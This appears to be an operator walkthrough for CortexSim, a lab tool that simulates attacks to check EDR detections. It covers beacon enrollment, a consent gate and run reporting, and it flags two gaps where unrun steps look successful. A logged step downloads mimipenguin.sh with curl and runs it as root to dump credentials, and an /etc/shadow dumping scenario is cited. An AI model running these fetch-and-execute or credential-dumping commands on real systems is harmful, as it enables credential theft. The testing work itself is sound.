# Launching a simulation — the verified operator walkthrough

> **Status (2026-08-31, verified live).** Every command below was actually run
> against a live SimCore (`cortex-pov-engine-simcore-1`, port 8888) with a real
> enrolled beacon and a real Tier-D provisioned target — nothing here is
> transcribed from source reading. Two dishonesty gaps were found and are
> called out where they occur (§5, §7); everything else matched its own
> documentation. **tenant-verified is 0** — nothing in this walkthrough, or in
> this repo, has run against a live Cortex tenant. A run's `tc_verdict` stays
> `pending` throughout; that is correct, not a bug.

This is the path a stranger — expert on Cortex, new to CortexSim — walks from
a running SimCore to a launched, honestly-reported simulation. It covers pull
mode (agent beacon) and push mode (self-contained bundle), the consent gate,
and exactly how to read a result without mistaking an unrun step for a Cortex
miss.

## 0. Prerequisites

```bash
export DOCKER_CONTEXT=default   # Docker Desktop hijacks the default context otherwise
cp .env.example .env            # set CORTEXSIM_MASTER_KEY etc.
./scripts/dev-up.sh             # builds the image + brings up SimCore on :8888
curl -s http://localhost:8888/api/health | python3 -m json.tool
```

`GET /api/health` is the one diagnostic surface and is worth reading before
anything else — it will not lie to you. On a fresh boot with no agents
enrolled yet it reports `"status": "degraded"` with `"agents": {"code":
"NO_AGENT_ONLINE", ...}` — that is correct, not broken. A **zero is degraded,
not ok**; this repo treats a healthy-looking empty state as a defect class of
its own.

## 1. Enroll a beacon (pull mode's front door)

Mint a short-lived, single-use enrollment token and run the one-liner it
gives you **on the target** (a customer jumpbox, or — as here — a container
standing in for one):

```bash
curl -s -X POST http://localhost:8888/api/agents/enroll/tokens \
  -H "Content-Type: application/json" \
  -d '{"max_uses": 1, "ttl_seconds": 3600}'
```
```json
{
  "token": "cxs_oLuqK_vu4K6NcpS4LkcWvwX5kOk4YNeSHQmGvFQywmY",
  "expires_at": "...", "max_uses": 1, "remaining_uses": 1
}
```

```bash
curl -fsSL 'http://<simcore-host>:8888/api/agents/install?os=linux' | \
  CORTEXSIM_TOKEN='cxs_oLuqK_...' bash
```

Verbatim output from a real run:

```
[cortexsim] target server : http://localhost:8888
[cortexsim] platform      : linux/amd64 (bd790i)
[cortexsim] enrolling with token ...FQywmY
[cortexsim] enrolled as   : bd790i-24719f
[cortexsim] fetching prebuilt beacon (linux/amd64)
[cortexsim] checksum OK   : 7e1660c52beeb7be…
[cortexsim-agent] starting — server=http://localhost:8888 id=bd790i-24719f interval=10s
[cortexsim-agent] registering — hostname=bd790i os=linux capabilities=[shell identity-harness artifact-fetch]
[cortexsim-agent] registration OK
```

No Go toolchain and no public-internet egress from the target were needed —
the binary came from this SimCore and was sha256-verified against the value
SimCore itself computed. The default install mode (`?mode=service`, omitted
above) installs a systemd unit (launchd on macOS) so the beacon survives the
SSH session; this walkthrough used `CORTEXSIM_MODE=foreground` to keep the
demo host clean.

Confirm it checked in:

```bash
curl -s http://localhost:8888/api/agents | python3 -c \
  "import json,sys; a=[x for x in json.load(sys.stdin)['agents'] if x['agent_id']=='bd790i-24719f']; print(a[0]['status'])"
# -> online
```

**Gotcha, verified:** if you enroll the beacon directly on a jumpbox and run
it as an unprivileged user (not root, no passwordless sudo for `runuser`),
every step whose `identity:` is a service account fails in a handful of
milliseconds with `runuser: may not be used by non-root users` — a real
`ENGINE`-adjacent environment failure, not a Cortex miss, but one that looks
exactly like a hang unless you read the stderr. Run the beacon as a service
(the documented default) or as root; do not `curl | bash` it as your own
unprivileged shell user and expect identity-harnessed steps to work.

## 2. Pick a scenario that does real work

Avoid the 141 echo/printf/touch-only steps in this corpus (`grep -L` the
scenario body for a command that is more than `echo` if unsure). This
walkthrough uses **`SIM-EDR-001`** — credential dumping via `/etc/shadow` +
the real `mimipenguin.sh` — because it is one of the few scenarios that
declares `requires_interpreters`, which turned out to matter (§5, §7).

### The consent gate is real — verified refusing, then verified passing

`SIM-EDR-001` references `TOOL-ATOMIC-RED-TEAM`, a `dual-use-lab-only`
adapter. Launching it **without** consent is refused, at both `POST
/api/runs` mode `pull` and mode `push` — the gate covers both:

```bash
curl -s -w '\nHTTP: %{http_code}\n' -X POST http://localhost:8888/api/runs \
  -H "Content-Type: application/json" \
  -d '{"scenario_id":"SIM-EDR-001","mode":"pull","target_agent_id":"bd790i-24719f"}'
```
```json
{"detail":{"error":"Scenario uses dual-use adapter 'TOOL-ATOMIC-RED-TEAM' (Atomic Red Team vmaster) but consent simulation_authorized is not set. Re-launch with consent.simulation_authorized=true to proceed.","code":"CONSENT_REQUIRED", ...}}
HTTP: 409
```

This is a real safety control, not a formality — do not script around it.
Re-launch with explicit consent and it proceeds:

```bash
curl -s -X POST http://localhost:8888/api/runs -H "Content-Type: application/json" -d '{
  "scenario_id":"SIM-EDR-001","mode":"pull",
  "target_agent_id":"bd790i-24719f",
  "consent":{"simulation_authorized":true}
}'
# -> {"run_id":"...", "mode":"pull", "message":"Task queued for agent '\''bd790i-24719f'\''"}
```

**Console equivalent:** the "New POV run" guided destination resolves the
scenario's `external_tools[].adapter_ref` against the adapter catalog and
renders a blocking checkbox — *"⚠ Tool consent required — I authorize
**lab-only** use of dual-use tools"* — before Launch is enabled
(`ui/src/components/console/LaunchView.jsx`). A first-timer never sees the
raw 409; they see the checkbox.

**Nuance worth knowing, verified:** the consent gate is enforced at the
tracked-**launch** boundary (`POST /api/runs`, both modes), not at the raw
**download** boundary. `GET /api/scenarios/SIM-EDR-001/download` returns the
self-contained bundle — dual-use tooling included — with **no consent
prompt and HTTP 200**, by design (`core/api/scenarios.py` calls this
endpoint "**Ungated path**"; the module's own rationale is that only
cluster-privileged K8s postures bound blast radius enough to gate at the
artifact boundary). A `c2-framework` tool gets a softer protection at this
path — the generated bundle logs a `WARN` and skips auto-install rather than
installing it — but a `dual-use-lab-only` tool like Atomic Red Team is
emitted into the downloadable script with no gate and no warning at all. If
you hand a downloaded bundle to someone else, they never see the consent
prompt SimCore's own launch path would have shown them.

## 3. Launch pull mode and read the result honestly

A bare `ubuntu:22.04` **cannot** run this corpus — `www-data` ships with
`/usr/sbin/nologin`, so the identity harness dies in ~7ms with *"This account
is currently not available"* before the TTP does anything. Use the
provisioned target this repo ships for exactly this purpose:

```bash
export DOCKER_CONTEXT=default
deploy/tier-d/run-tier-d.sh --scenario SIM-EDR-001
```

This script is the real path, automated and re-runnable: builds
`deploy/tier-d/Dockerfile.target` (provisions every identity the corpus
actually uses), enrolls a **real beacon** via the real one-liner (correlated
by install telemetry, not by guessing "the first online agent" — a real
race condition this script had to close, see its own header comment),
launches with explicit consent, polls to a terminal state, and classifies the
result into ENGINE / ENVIRONMENT / TTP. Verbatim output from a real run:

```
✓ SimCore reachable at http://localhost:8888
✓ target 'cortexsim-tier-d-target' up
✓ beacon online: bd790i-8759c6
✓ run 2a8da422-5040-4c82-8e24-e5db5c63e5c0
✓ terminal status: failed  (run.json saved)

  scenario        SIM-EDR-001
  run status      failed   tc_verdict=pending
  steps           5 reported / 5 declared

   ✓ step 1 [www-data] T1087.001  exit=0  OK
   ✓ step 2 [www-data] T1003.008  exit=0  OK
   ✓ step 3 [www-data] T1552.001  exit=0  OK
   ✓ step 4 [root] T1003  exit=0  OK
   ~ step 5 [root] T1003  exit=127  ENVIRONMENT
       └─ a step-declared interpreter was not found on the target and no
          authorized install could supply it — the step's own command was
          NEVER executed, so any absent detection here is not a Cortex miss

  OK 4 · ENVIRONMENT 1 · TTP 0 · ENGINE 0

  HARNESS PASS, with unrun steps — the engine worked; the target could not
  support every step. Those steps produced NO signal, so their absent
  detections must NOT be reported as a coverage gap.
```
`exit code: 0` (harness PASS). This is the answer to "did the *engine* work":
yes — the beacon correctly detected the missing `python` interpreter
**before** running mimipenguin, refused the step, and said so in plain text
(`agent/beacon/client.go::resolveRuntimeDeps`,
`docs/design/agent-runtime-dependencies.md`) rather than letting the
scenario's own `|| echo '[*] ... complete'` fallback mask it as a success.
`step-05`'s raw output carries the honest marker verbatim:

```
!! RUNTIME_DEPENDENCY_MISSING: python — this step's command was NOT
   executed, so it produced no signal. This is an ENVIRONMENT gap, not a
   detection result.
```

`deploy/tier-d/Dockerfile.target` deliberately does **not** ship `python3` —
adding it would make this one lab pass while proving nothing about a real
customer host, whose package set this repo does not control. The honest
refusal is the fix; the lab exists to keep proving that refusal fires.

### How the console shows this, verified

Auto-navigating from a successful launch, the console lands on
`Runs → <run> → Live`. `RunDetailView.jsx` renders a **run-level banner** the
moment `run.status` is `failed`/`aborted`, above every sub-tab: *"RUN
FAILED — The simulation stopped before completing — coverage figures on this
run are not a measurement of the tenant's detections,"* plus the tail of the
captured output. The Storyline view goes further per-detection:
`reconcileStatus()` (`ui/src/components/DetectionStoryline.jsx`) downgrades
every un-reviewed detection on an unproven run from `missed` to
**`not-executed`** — a customer-facing distinction the console gets right by
construction, not by luck. **This is the part of the mission that is already
solid: a stranger reading the live console for this run cannot mistake
step-05's absent detections for a Cortex miss.**

## 4. Launch push mode

```bash
curl -s "http://localhost:8888/api/scenarios/SIM-EDR-001/download?format=auto" \
  -o cortexsim-SIM-EDR-001.sh
# headers verified: 200, x-cortexsim-bundle-target: posix,
#                   x-cortexsim-bundle-selfcontained: true
```

Copy it to the (provisioned) target and run it — no SimCore dependency at
runtime:

```bash
docker cp cortexsim-SIM-EDR-001.sh cortexsim-tier-d-target:/root/
docker exec cortexsim-tier-d-target bash /root/cortexsim-SIM-EDR-001.sh
```

## 5. GAP FOUND — push mode has no runtime-dependency refusal

Verbatim tail of a real run, exit code **0**:

```
[INFO] STEP step-05 identity=root cmd=curl -sSL https://raw.githubusercontent.com/huntergregal/mimipenguin/master/mimipenguin.sh -o /tmp/mimipenguin.sh && chmod +x /tmp/mimipenguin.sh && timeout 30 bash /tmp/mimipenguin.sh 2>&1 | tee /tmp/mimi_output.txt || echo '[*] Mimipenguin execution complete'
Error: No supported version of 'python' found in /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
[INFO] Step step-05 completed successfully
[INFO] CortexSim bundle complete — scenario=SIM-EDR-001
```

**This is the exact failure mode the whole project exists to prevent,
reproduced live.** The pull-mode beacon's `resolveRuntimeDeps` check
(§3) exists *specifically* to stop `requires_interpreters` gaps from
presenting as success. `core/engine/push_generator.py` — the code that
renders `SIM-EDR-001` into this self-contained script — never reads
`requires_interpreters` at all (`grep -n requires_interpreters
core/engine/push_generator.py` returns nothing). The generated bundle's
own `|| echo '[*] ... complete'` fallback, which the pull-mode fix was
built to stop trusting, is still trusted here: mimipenguin never ran, and
the bundle's own log says **"Step step-05 completed successfully."** A DC
running this exact bundle against a real target and later finding no
`bioc-edr-001-mimipenguin-credential-dumper-execution` alert in the tenant
has no signal, anywhere in this output, that the step never actually
executed.

Confirmed scoped, not accidental-but-covered-elsewhere:
`docs/design/agent-runtime-dependencies.md` §6 ("What this explicitly does
NOT solve") lists air-gapped targets, orchestrator-preflight staleness,
Windows, and alias-table drift as known, deliberate gaps — **push mode
is not on that list.** It was not scoped out; it was not considered. Today
only `SIM-EDR-001` declares `requires_interpreters` (`grep -rl
requires_interpreters: scenarios/` → 2 hits, one is `_schema.yml`), so the
blast radius is one scenario, but the mechanism gap is structural: any future
scenario that declares `requires_interpreters` and `push_supported: true`
inherits this silent false-positive. **Flagging for whoever owns
`core/engine/push_generator.py` / `agent/beacon/client.go` — not fixed here,
per this task's file ownership.**

## 6. Console guided-flow — confirmed, no dead end

Walked the default console (`AppConsole.jsx`, not the `?theme=legacy`
escape hatch — the onboarding tour's five stops target the default shell's
`nav-library` / `nav-agents` / `nav-runs` anchors, so this is the path a
first-timer actually gets):

1. **Library** → arm a scenario ("Each card is an ordered set of steps...").
2. **Agents** → *"Nothing runs without a beacon"* if none are enrolled, with
   an inline **"Deploy one now"** stop that mints the token and shows the
   one-liner in-product.
3. **New POV run** (`ui/src/app/destinations.jsx`) → target/agent picker →
   the consent checkbox from §2 when the scenario needs it → **Launch**.
4. On a successful launch, `onRunComplete` fires `onNavigate('runs', {run:
   <id>, tab: 'live'})` — **verified in `destinations.jsx`**: the operator
   is taken straight to the Run Detail Live view, not left reading a bare
   "Run started" toast with nowhere to click. (A parallel `App.jsx` legacy
   shell has a weaker `onRunComplete` that only shows a toast and does not
   navigate — but that shell is reachable only via the explicit
   `?theme=legacy` escape hatch, not the default path, so it is not the
   dead end it first appeared to be.)

No first-run dead end found in the default guided path.

## 7. GAP FOUND — the exported POV report doesn't carry the runtime-dependency marker either

The customer-facing artifact — `GET /api/runs/{id}/report?format=markdown`,
reachable from the console's own Export menu (`ExportMenu.jsx →
downloadReport`, labelled *"the narrative report a DC walks out of a meeting
with"*) — is a **different honesty mechanism** from the console's live
Storyline view (§3), and it has the gap the live view does not.

`core/api/runs.py::_execution_integrity()` prepends a **"⚠ Execution
Integrity — READ THIS FIRST"** section to the report specifically to prevent
this exact class of defect — its own comment says so: *"A run whose tooling
never reached the target would otherwise render as an ordinary miss ... That
is the manufactured false negative relocated ... into the one artifact a DC
actually puts in front of a customer."* It fires by matching `run.output`
against `_INTEGRITY_MARKERS`, a 4-item tuple: `ARTIFACT STAGING FAILED`,
`PAYLOAD_NOT_STAGED_ON_TARGET`, `ARTIFACT_SPEC_INVALID`, `RUN FAILED ON
RESTART`. **`RUNTIME_DEPENDENCY_MISSING` — the marker §3 verified the
beacon actually emits — is not in that list.**

Verified against the real `SIM-EDR-001` run from §3
(`GET /api/runs/2a8da422-.../report?format=markdown`): no integrity section
renders at all, and the coverage table reads **"Overall: 0/10 detections
confirmed (0.0%)"** with all ten expected detections — the seven from
steps 1–4, which genuinely executed, *and* the three from step-05, which
never ran — rendered identically as plain `❌`. Nothing in the document a
DC would actually hand to a customer distinguishes "this technique ran and
wasn't observed" from "this technique never ran." The JSON report format
(`format=json`) carries the same `execution_integrity: {"ok": true,
"problems": []}` — also silent, same cause.

This is narrower than it looks (only reachable today via `SIM-EDR-001`, the
scenario this repo already leans on hardest for this exact lesson) but it is
the same defect class as §5, in the reporting layer instead of the
execution layer, and it is a **one-line fix**: add
`("RUNTIME_DEPENDENCY_MISSING", "a step-declared interpreter was not found on
the target and no authorized install could supply it — the step never ran")`
to `_INTEGRITY_MARKERS` in `core/api/runs.py`. Flagging rather than applying
it, per this task's file ownership (`core/api/runs.py` is outside the one
file this task owns).

## Summary — what a stranger should take from this doc

- Enroll via the token one-liner; run the beacon as a service or root, not
  as your own unprivileged shell user.
- Pick a scenario, expect the consent checkbox for dual-use tooling — it is
  a real gate, don't route around it, and remember it does **not** cover a
  raw bundle download (§2).
- Use a provisioned target (`deploy/tier-d/`), never bare `ubuntu:22.04`.
- Trust the **console's live Run Detail / Storyline view** to tell you
  honestly whether a detection miss was real. Do **not** trust the exported
  markdown/JSON report's silence on `RUNTIME_DEPENDENCY_MISSING` as proof
  everything executed (§7), and do **not** trust a push-mode bundle's own
  "completed successfully" line for a `requires_interpreters` step (§5) —
  today, only pull mode's beacon actually checks.
- `tc_verdict` reads `pending` throughout, always, because tenant-verified
  is 0. That is correct.
